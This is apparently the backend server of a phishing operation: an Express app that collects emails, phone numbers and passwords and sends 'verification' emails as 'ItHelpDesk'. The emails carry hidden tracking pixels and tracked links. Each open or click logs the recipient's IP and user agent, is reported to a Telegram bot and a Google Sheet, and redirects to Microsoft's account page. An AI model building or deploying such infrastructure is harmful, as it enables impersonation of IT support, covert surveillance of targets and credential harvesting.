import path from "path";
import { fileURLToPath } from "url";
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import pkg from "pg";
import bcrypt from "bcrypt";
import nodemailer from "nodemailer";
import crypto from "crypto";
import rateLimit from "express-rate-limit";
import jwt from "jsonwebtoken";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const PORT = process.env.PORT || 4000;
const { Pool } = pkg;

app.set("trust proxy", 1);

/* =========================
   DATABASE
========================= */

const pgPool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false,
  },
  connectionTimeoutMillis: 30000,
});

pgPool.on("error", (error) => {
  console.error("DATABASE POOL ERROR:", error.message);
});

function isTransientDatabaseError(error) {
  const transientCodes = new Set([
    "ECONNRESET",
    "ECONNREFUSED",
    "EPIPE",
    "ETIMEDOUT",
    "ENETUNREACH",
  ]);
  const message = String(error?.message || "").toLowerCase();

  return (
    transientCodes.has(error?.code) ||
    message.includes("connection terminated unexpectedly") ||
    message.includes("connection terminated due to connection timeout") ||
    message.includes("client network socket disconnected") ||
    message.includes("timeout expired")
  );
}

async function queryDatabase(text, values = []) {
  const maxAttempts = 3;

  for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
    try {
      return await pgPool.query(text, values);
    } catch (error) {
      if (!isTransientDatabaseError(error) || attempt === maxAttempts) {
        throw error;
      }

      console.warn(
        `DATABASE RETRY ${attempt}/${maxAttempts - 1}:`,
        error.code || error.message,
      );
      await new Promise((resolve) => setTimeout(resolve, attempt * 500));
    }
  }

  throw new Error("Database query failed after retry");
}

const pool = {
  query: queryDatabase,
};

/* =========================
   SHARED HELPERS
========================= */

function normalizeEmail(value) {
  return String(value || "").trim().toLowerCase();
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function publicBaseUrl(req) {
  const configured = String(process.env.PUBLIC_BASE_URL || "").trim();
  if (configured) return configured.replace(/\/+$/, "");

  return `${req.protocol}://${req.get("host")}`.replace(/\/+$/, "");
}

function verificationDestination() {
  return (
    String(process.env.VERIFICATION_REDIRECT_URL || "").trim() ||
    "https://account.microsoft.com/account"
  );
}

function absoluteDestination(destination, baseUrl) {
  try {
    return new URL(destination, `${baseUrl}/`).toString();
  } catch {
    return "https://account.microsoft.com/account";
  }
}

function trackingPixelBuffer() {
  return Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M/wHwAF/gL+Xj5WAAAAAElFTkSuQmCC",
    "base64",
  );
}

function requestMetadata(req) {
  const forwarded = String(req.headers["x-forwarded-for"] || "")
    .split(",")[0]
    .trim();

  return {
    ip: forwarded || req.ip || null,
    userAgent: String(req.headers["user-agent"] || "").slice(0, 1000) || null,
  };
}

async function postToGoogleSheet(payload) {
  if (!process.env.GOOGLE_SCRIPT_URL) return;

  const response = await fetch(process.env.GOOGLE_SCRIPT_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
    redirect: "follow",
    signal: AbortSignal.timeout(8000),
  });

  if (!response.ok) {
    throw new Error(`Google Sheets returned HTTP ${response.status}`);
  }
}

async function sendTelegram(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const response = await fetch(
    `https://api.telegram.org/bot${token}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        disable_web_page_preview: true,
      }),
      signal: AbortSignal.timeout(8000),
    },
  );

  if (!response.ok) {
    throw new Error(`Telegram returned HTTP ${response.status}`);
  }
}

function reportNotificationFailure(label, result) {
  if (result.status === "rejected") {
    console.error(`${label} ERROR:`, result.reason?.message || result.reason);
  }
}

async function publishTrackingEvent(event, record, metadata) {
  const occurredAt = new Date().toISOString();
  const isOpen = event === "opened";
  const title = isOpen ? "📧 EMAIL OPENED" : "🔗 LINK CLICKED";

  const sheetPayload = {
    event,
    trackingId: record.tracking_id,
    recipient: record.recipient,
    subject: record.subject,
    destination: record.destination_url,
    status: event,
    opened: isOpen ? "Yes" : record.opened ? "Yes" : "No",
    clicked: isOpen ? (record.clicked ? "Yes" : "No") : "Yes",
    openTime: isOpen ? occurredAt : record.first_open_at || "",
    clickTime: isOpen ? record.first_click_at || "" : occurredAt,
    ip: metadata.ip,
    userAgent: metadata.userAgent,
  };

  const message = [
    title,
    "",
    `Recipient: ${record.recipient}`,
    `Subject: ${record.subject || "(none)"}`,
    `Tracking ID: ${record.tracking_id}`,
    `Time: ${occurredAt}`,
    metadata.ip ? `IP: ${metadata.ip}` : null,
  ]
    .filter(Boolean)
    .join("\n");

  const [sheetResult, telegramResult] = await Promise.allSettled([
    postToGoogleSheet(sheetPayload),
    sendTelegram(message),
  ]);

  reportNotificationFailure("GOOGLE SHEETS", sheetResult);
  reportNotificationFailure("TELEGRAM", telegramResult);
}

/* =========================
   AUTH MIDDLEWARE
========================= */

function auth(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader) {
    return res.status(401).json({ error: "No token" });
  }

  const token = authHeader.startsWith("Bearer ")
    ? authHeader.split(" ")[1]
    : authHeader;

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    return res.status(401).json({ error: "Invalid token" });
  }
}

/* =========================
   MIDDLEWARE
========================= */

app.use(
  cors({
    origin: [
      "https://official-2pf.pages.dev",
      "http://localhost:4000",
    ],
    methods: ["GET", "POST"],
    credentials: true,
  }),
);

app.use(express.json({ limit: "100kb" }));
app.use(express.urlencoded({ extended: true, limit: "100kb" }));

app.use(
  rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 200,
    standardHeaders: true,
    legacyHeaders: false,
  }),
);

const verifyCodeLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 30,
  standardHeaders: true,
  legacyHeaders: false,
  message: {
    success: false,
    error: "Too many verification attempts. Try again later.",
  },
});

/* =========================
   INIT DB
========================= */

async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email TEXT UNIQUE NOT NULL,
        phone TEXT,
        password_hash TEXT NOT NULL,
        email_verified BOOLEAN DEFAULT false,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS email_verifications (
        id SERIAL PRIMARY KEY,
        email TEXT,
        user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
        code TEXT NOT NULL,
        attempts INTEGER NOT NULL DEFAULT 0,
        expires_at BIGINT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await pool.query(`
      ALTER TABLE email_verifications
      ADD COLUMN IF NOT EXISTS email TEXT
    `);

    await pool.query(`
      ALTER TABLE email_verifications
      ADD COLUMN IF NOT EXISTS attempts INTEGER NOT NULL DEFAULT 0
    `);

    await pool.query(`
      CREATE INDEX IF NOT EXISTS email_verifications_email_idx
      ON email_verifications (email)
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS email_tracking (
        tracking_id UUID PRIMARY KEY,
        recipient TEXT NOT NULL,
        subject TEXT,
        destination_url TEXT NOT NULL,
        provider_message_id TEXT,
        opened BOOLEAN NOT NULL DEFAULT false,
        clicked BOOLEAN NOT NULL DEFAULT false,
        open_count INTEGER NOT NULL DEFAULT 0,
        click_count INTEGER NOT NULL DEFAULT 0,
        first_open_at TIMESTAMPTZ,
        last_open_at TIMESTAMPTZ,
        first_click_at TIMESTAMPTZ,
        last_click_at TIMESTAMPTZ,
        last_open_ip TEXT,
        last_click_ip TEXT,
        last_open_user_agent TEXT,
        last_click_user_agent TEXT,
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE INDEX IF NOT EXISTS email_tracking_recipient_idx
      ON email_tracking (recipient)
    `);

    await pool.query(`
      CREATE INDEX IF NOT EXISTS email_tracking_created_at_idx
      ON email_tracking (created_at)
    `);

    console.log("✅ Database ready");
  } catch (err) {
    console.error("DB ERROR:", err);
  }
}

initDB();

/* =========================
   MAILER (RESEND)
========================= */

const transporter = nodemailer.createTransport({
  host: "smtp.resend.com",
  port: 587,
  secure: false,
  auth: {
    user: "resend",
    pass: process.env.RESEND_API_KEY,
  },
});

transporter
  .verify()
  .then(() => console.log("✅ Mail server ready"))
  .catch((err) => console.error("❌ Mailer error:", err.message));

/* =========================
   ROUTES
========================= */

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/account", (req, res) => {
  res.redirect(302, "https://account.microsoft.com/account");
});

/* =========================
   CLICK TRACKING REDIRECT
========================= */

app.get("/r/:trackingId", async (req, res) => {
  const { trackingId } = req.params;

  if (
    !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
      trackingId,
    )
  ) {
    return res.status(404).send("Invalid tracking link");
  }

  try {
    const metadata = requestMetadata(req);
    const result = await pool.query(
      `UPDATE email_tracking
       SET clicked = true,
           click_count = click_count + 1,
           first_click_at = COALESCE(first_click_at, NOW()),
           last_click_at = NOW(),
           last_click_ip = $2,
           last_click_user_agent = $3
       WHERE tracking_id = $1
       RETURNING *`,
      [trackingId, metadata.ip, metadata.userAgent],
    );

    if (!result.rows.length) {
      return res.status(404).send("Invalid tracking link");
    }

    const record = result.rows[0];
    const destination = absoluteDestination(
      record.destination_url,
      publicBaseUrl(req),
    );

    res.redirect(302, destination);

    void publishTrackingEvent("clicked", record, metadata).catch((error) => {
      console.error("CLICK NOTIFICATION ERROR:", error.message);
    });
  } catch (error) {
    console.error("CLICK TRACKING ERROR:", error);
    return res.status(500).send("Unable to open this link");
  }
});

/* =========================
   OPEN TRACKING PIXEL
========================= */

app.get("/o/:trackingId.png", async (req, res) => {
  const { trackingId } = req.params;

  res.set({
    "Content-Type": "image/png",
    "Content-Length": trackingPixelBuffer().length,
    "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
    Pragma: "no-cache",
    Expires: "0",
  });

  if (
    !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
      trackingId,
    )
  ) {
    return res.end(trackingPixelBuffer());
  }

  try {
    const metadata = requestMetadata(req);
    const result = await pool.query(
      `UPDATE email_tracking
       SET opened = true,
           open_count = open_count + 1,
           first_open_at = COALESCE(first_open_at, NOW()),
           last_open_at = NOW(),
           last_open_ip = $2,
           last_open_user_agent = $3
       WHERE tracking_id = $1
       RETURNING *`,
      [trackingId, metadata.ip, metadata.userAgent],
    );

    res.end(trackingPixelBuffer());

    const record = result.rows[0];
    if (!record) return;

    const notifyRepeats =
      String(process.env.NOTIFY_REPEAT_OPENS || "").toLowerCase() === "true";

    if (record.open_count === 1 || notifyRepeats) {
      void publishTrackingEvent("opened", record, metadata).catch((error) => {
        console.error("OPEN NOTIFICATION ERROR:", error.message);
      });
    }
  } catch (error) {
    console.error("OPEN TRACKING ERROR:", error.message);
    if (!res.writableEnded) res.end(trackingPixelBuffer());
  }
});

/* =========================
   REGISTER
========================= */

function normalizePhone(value) {
  let phone = String(value || "").trim();
  phone = phone.replace(/(?:ext\.?|extension|x)\s*\d+$/i, "").trim();
  phone = phone.replace(/[\s().-]/g, "");

  if (phone.startsWith("00")) phone = `+${phone.slice(2)}`;
  if (/^\d{10}$/.test(phone)) phone = `+1${phone}`;
  else if (/^1\d{10}$/.test(phone)) phone = `+${phone}`;

  return /^\+[1-9]\d{6,14}$/.test(phone) ? phone : null;
}

app.post("/register", async (req, res) => {
  try {
    const { email, password, phone } = req.body;

    if (!email || !password || !phone) {
      return res.status(400).json({
        success: false,
        error: "Missing fields",
      });
    }

    const normalizedEmail = normalizeEmail(email);
    const normalizedPhone = normalizePhone(phone);

    if (!normalizedPhone) {
      return res.status(400).json({
        success: false,
        error: "Enter a valid phone number with country code",
      });
    }

    const existing = await pool.query(
      `SELECT id, email_verified FROM users WHERE email = $1 LIMIT 1`,
      [normalizedEmail],
    );

    const passwordHash = await bcrypt.hash(password, 12);

    if (existing.rows.length) {
      if (existing.rows[0].email_verified) {
        return res.status(400).json({
          success: false,
          error: "User already exists",
        });
      }

      const user = await pool.query(
        `UPDATE users
         SET phone = $2, password_hash = $3
         WHERE email = $1
         RETURNING id, email`,
        [normalizedEmail, normalizedPhone, passwordHash],
      );

      return res.json({ success: true, user: user.rows[0], retry: true });
    }

    const user = await pool.query(
      `INSERT INTO users (email, phone, password_hash)
       VALUES ($1, $2, $3)
       RETURNING id, email`,
      [normalizedEmail, normalizedPhone, passwordHash],
    );

    return res.json({
      success: true,
      user: user.rows[0],
    });
  } catch (err) {
    console.error("REGISTER ERROR:", err);
    return res
      .status(500)
      .json({ success: false, error: "Registration failed" });
  }
});

/* =========================
   SEND EMAIL CODE
========================= */

app.post("/send-email-code", async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res
        .status(400)
        .json({ success: false, error: "Email required" });
    }

    const normalizedEmail = normalizeEmail(email);
    const userResult = await pool.query(
      `SELECT id FROM users WHERE email = $1 LIMIT 1`,
      [normalizedEmail],
    );

    if (!userResult.rows.length) {
      return res
        .status(404)
        .json({ success: false, error: "User not found" });
    }

    const recent = await pool.query(
      `SELECT created_at
       FROM email_verifications
       WHERE email = $1
       ORDER BY created_at DESC
       LIMIT 1`,
      [normalizedEmail],
    );

    if (recent.rows.length) {
      const last = new Date(recent.rows[0].created_at).getTime();
      if (Date.now() - last < 60 * 1000) {
        return res.status(429).json({
          success: false,
          error: "Wait 1 minute before retrying",
        });
      }
    }

    const code = crypto.randomInt(100000, 1000000).toString();
    const expiresAt = Date.now() + 10 * 60 * 1000;
    const trackingId = crypto.randomUUID();
    const subject = "Your Verification Code";
    const baseUrl = publicBaseUrl(req);
    const destination = verificationDestination();
    const trackedLink = `${baseUrl}/r/${trackingId}`;
    const openPixel = `${baseUrl}/o/${trackingId}.png`;

    await pool.query(`DELETE FROM email_verifications WHERE email = $1`, [
      normalizedEmail,
    ]);

    const verification = await pool.query(
      `INSERT INTO email_verifications (email, code, expires_at)
       VALUES ($1, $2, $3)
       RETURNING id`,
      [normalizedEmail, code, expiresAt],
    );

    await pool.query(
      `INSERT INTO email_tracking
         (tracking_id, recipient, subject, destination_url)
       VALUES ($1, $2, $3, $4)`,
      [trackingId, normalizedEmail, subject, destination],
    );

    try {
      const safeCode = escapeHtml(code);
      const safeTrackedLink = escapeHtml(trackedLink);
      const safeOpenPixel = escapeHtml(openPixel);

      const delivery = await transporter.sendMail({
        from: `"ItHelpDesk" <${process.env.EMAIL_FROM}>`,
        to: normalizedEmail,
        subject,
        text: [
          `Your verification code is ${code}.`,
          "It expires in 10 minutes.",
          "",
          `Continue: ${trackedLink}`,
        ].join("\n"),
        html: `
          <div style="font-family:Arial,sans-serif;line-height:1.5;color:#1f2937">
            <h2 style="margin-bottom:8px">Your verification code</h2>
            <p>Use this code to continue. It expires in 10 minutes.</p>
            <p style="font-size:32px;font-weight:700;letter-spacing:6px;margin:24px 0">
              ${safeCode}
            </p>
            <p>
              <a href="${safeTrackedLink}"
                 style="display:inline-block;padding:12px 20px;background:#2563eb;color:#fff;text-decoration:none;border-radius:6px">
                Continue
              </a>
            </p>
            <p style="font-size:12px;color:#6b7280">
              You still need to enter the verification code in the sign-in page.
            </p>
            <img src="${safeOpenPixel}" width="1" height="1" alt=""
                 style="display:block;width:1px;height:1px;border:0" />
          </div>
        `,
      });

      if (!delivery.accepted?.length) {
        throw new Error("Mail provider did not accept the recipient");
      }

      await pool.query(
        `UPDATE email_tracking
         SET provider_message_id = $2
         WHERE tracking_id = $1`,
        [trackingId, delivery.messageId || null],
      );
    } catch (deliveryError) {
      await Promise.allSettled([
        pool.query(`DELETE FROM email_verifications WHERE id = $1`, [
          verification.rows[0].id,
        ]),
        pool.query(`DELETE FROM email_tracking WHERE tracking_id = $1`, [
          trackingId,
        ]),
      ]);

      console.error("DELIVERY ERROR:", deliveryError.message);
      return res.status(502).json({
        success: false,
        error: "We could not deliver the code. Please try again.",
      });
    }

    return res.json({ success: true, message: "Code sent" });
  } catch (err) {
    console.error("SEND ERROR:", err);
    return res.status(500).json({ success: false, error: "Server error" });
  }
});

/* =========================
   VERIFY EMAIL CODE
========================= */

app.post("/verify-email-code", verifyCodeLimiter, async (req, res) => {
  try {
    const { email, code } = req.body;
    const submittedCode = String(code || "").trim();

    if (!email || !/^\d{6}$/.test(submittedCode)) {
      return res.status(400).json({
        success: false,
        error: "Enter a valid 6-digit code",
      });
    }

    const normalizedEmail = normalizeEmail(email);
    const result = await pool.query(
      `SELECT *
       FROM email_verifications
       WHERE email = $1
       ORDER BY created_at DESC
       LIMIT 1`,
      [normalizedEmail],
    );

    if (!result.rows.length) {
      return res.status(400).json({
        success: false,
        error: "No code found",
      });
    }

    const record = result.rows[0];

    if (Date.now() > Number(record.expires_at)) {
      await pool.query(`DELETE FROM email_verifications WHERE email = $1`, [
        normalizedEmail,
      ]);

      return res.status(400).json({
        success: false,
        error: "Code expired",
      });
    }

    const codeMatches =
      submittedCode.length === String(record.code).length &&
      crypto.timingSafeEqual(
        Buffer.from(submittedCode),
        Buffer.from(String(record.code)),
      );

    if (!codeMatches) {
      const failedAttempt = await pool.query(
        `UPDATE email_verifications
         SET attempts = attempts + 1
         WHERE id = $1
         RETURNING attempts`,
        [record.id],
      );

      const attempts = failedAttempt.rows[0]?.attempts ?? 5;
      if (attempts >= 5) {
        await pool.query(`DELETE FROM email_verifications WHERE id = $1`, [
          record.id,
        ]);
        return res.status(429).json({
          success: false,
          error: "Too many invalid attempts. Request a new code.",
        });
      }

      return res.status(400).json({
        success: false,
        error: `Invalid code. ${5 - attempts} attempts remaining.`,
      });
    }

    const userResult = await pool.query(
      `UPDATE users
       SET email_verified = true
       WHERE email = $1
       RETURNING id, email`,
      [normalizedEmail],
    );

    await pool.query(`DELETE FROM email_verifications WHERE email = $1`, [
      normalizedEmail,
    ]);

    const user = userResult.rows[0];
    if (!user) {
      return res.status(404).json({
        success: false,
        error: "User not found",
      });
    }

    const token = jwt.sign(
      { id: user.id, email: user.email },
      process.env.JWT_SECRET,
      { expiresIn: "1h" },
    );

    return res.json({
      success: true,
      message: "Email verified",
      token,
    });
  } catch (err) {
    console.error("VERIFY ERROR:", err);
    return res.status(500).json({
      success: false,
      error: "Verification failed",
    });
  }
});

/* =========================
   LOGIN
========================= */

app.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: "Missing fields",
      });
    }

    const normalizedEmail = normalizeEmail(email);
    const result = await pool.query(
      `SELECT * FROM users WHERE email = $1 LIMIT 1`,
      [normalizedEmail],
    );

    if (!result.rows.length) {
      return res.status(400).json({
        success: false,
        error: "Invalid credentials",
      });
    }

    const user = result.rows[0];
    const valid = await bcrypt.compare(password, user.password_hash);

    if (!valid) {
      return res.status(400).json({
        success: false,
        error: "Invalid credentials",
      });
    }

    if (!user.email_verified) {
      return res.status(403).json({
        success: false,
        error: "Verify your email before signing in",
      });
    }

    const token = jwt.sign(
      { id: user.id, email: user.email },
      process.env.JWT_SECRET,
      { expiresIn: "1h" },
    );

    return res.json({
      success: true,
      token,
      user: {
        id: user.id,
        email: user.email,
        phone: user.phone,
        email_verified: user.email_verified,
      },
    });
  } catch (err) {
    console.error("LOGIN ERROR:", err);
    return res.status(500).json({ success: false, error: "Login failed" });
  }
});

/* =========================
   DASHBOARD
========================= */

app.get("/dashboard", auth, async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT id, email, phone, email_verified, created_at
       FROM users
       WHERE email = $1
       LIMIT 1`,
      [req.user.email],
    );

    return res.json({
      success: true,
      user: result.rows[0],
    });
  } catch (err) {
    console.error("DASHBOARD ERROR:", err);
    return res.status(500).json({
      success: false,
      error: "Dashboard fetch failed",
    });
  }
});

/* =========================
   CLEANUP JOB
========================= */

setInterval(
  async () => {
    try {
      const retentionDays = Math.max(
        1,
        Number.parseInt(process.env.TRACKING_RETENTION_DAYS || "90", 10) || 90,
      );

      await Promise.all([
        pool.query(`DELETE FROM email_verifications WHERE expires_at < $1`, [
          Date.now(),
        ]),
        pool.query(
          `DELETE FROM email_tracking
           WHERE created_at < NOW() - ($1 * INTERVAL '1 day')`,
          [retentionDays],
        ),
      ]);
    } catch (err) {
      console.error("CLEANUP ERROR:", err);
    }
  },
  5 * 60 * 1000,
);

/* =========================
   404
========================= */

app.use((req, res) => {
  return res.status(404).json({ success: false, error: "Not found" });
});

/* =========================
   START SERVER
========================= */

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
